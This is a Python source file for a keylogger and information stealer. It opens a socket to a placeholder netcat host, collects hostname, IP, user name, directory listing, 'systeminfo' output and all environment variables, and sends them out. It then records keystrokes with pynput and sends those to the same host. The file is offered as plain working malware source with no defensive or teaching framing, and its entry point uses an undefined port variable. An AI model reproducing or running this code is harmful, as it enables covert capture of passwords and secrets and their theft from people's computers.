import platform
import sys
import os
import socket
import time
from pynput import keyboard
import subprocess
import getpass
import threading


global BLUE,RED, WHITE, YELLOW, MAGENTA, GREEN, END
BLUE, RED, WHITE, YELLOW, MAGENTA, GREEN, END = '\33[94m', '\033[91m', '\33[97m', '\33[93m', '\033[1;35m', '\033[1;32m', '\033[0m'



class start:
    
    def __init__(self,name_nc,port_nc):
        self.name = name_nc
        self.port = port_nc
        self.list = []
        self.list2 = []
        self.connect = None 

        self.connect_nc()

    def connect_nc(self):
        try:
            self.connect = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
            self.connect.connect((self.name,self.port))
            print('connection True')
        except Exception:
            sys.exit()
        there = threading.Thread(target=self.taking_information,daemon=True)
        there.start()

    def start_loger(self):
        
        def on_press(key):
            
            try:
                
                print(f'[-] {key.char}')
                self.list.append(key.char)
            except AttributeError:
                print(f'[-] {key}')
                self.list2.append(str(key))
            
        def close(key):
            if key ==  keyboard.Key.esc:
                return False
        
        
        with keyboard.Listener(
            on_press=on_press,
            on_release=close) as listener:
            listener.join()
        

    def taking_information(self):
        if self.connect:
            hostname = socket.gethostname()
            ip = socket.gethostbyname(hostname)
            plat = platform.processor()
            system = platform.system()
            machine = platform.machine()
            platform_sys = sys.platform
            version = sys.version
            user = getpass.getuser()
            path = os.path.expanduser('~')
            file_directory = os.listdir()
            path_now = os.getcwd()
            check_out = subprocess.check_output("systeminfo",shell=True,text=True)
            res = ''
            for key , item in os.environ.items():
                res += f'{key} = {item}\n'

            data= f'''
{RED}=== INFORMATION SYSTEM ==={END}
{GREEN}Hostname:{END} {hostname}
{GREEN}IP:{END} {ip}
{GREEN}Processor:{END} {plat}
{GREEN}System:{END} {system}
{GREEN}Machine:{END} {machine}

{RED}=== MORE INFORMATION ==={END}
{GREEN}Version:{END} {version}
{GREEN}User:{END} {user}
{GREEN}Home Path:{END} {path}
{GREEN}Files:{END} {file_directory}
{GREEN}Current Path:{END} {path_now}
{GREEN}platform:{END} {platform_sys}
{RED}=== SYSTEMINFO OUTPUT ==={END}
{check_out}

{RED}=== ENV VARIABLES ==={END}
{res}
'''
            self.connect.sendall(data.encode('utf-8'))


    def send_nc(self):
        if self.connect:
            self.connect.send(f'{GREEN}data ={END} {''.join(self.list)}'.encode('utf-8'))
            self.connect.send(f'\n{GREEN}spishal key ={END} {self.list2}'.encode('utf-8'))
        else:
            sys.exit()



    def stop(self):
        self.connect.close()
        return False      
        
if __name__ == '__main__':
    s = start('nc_ip',nc_port)
    if s.connect:
        s.start_loger()
        s.send_nc()
    else:
        s.stop()  

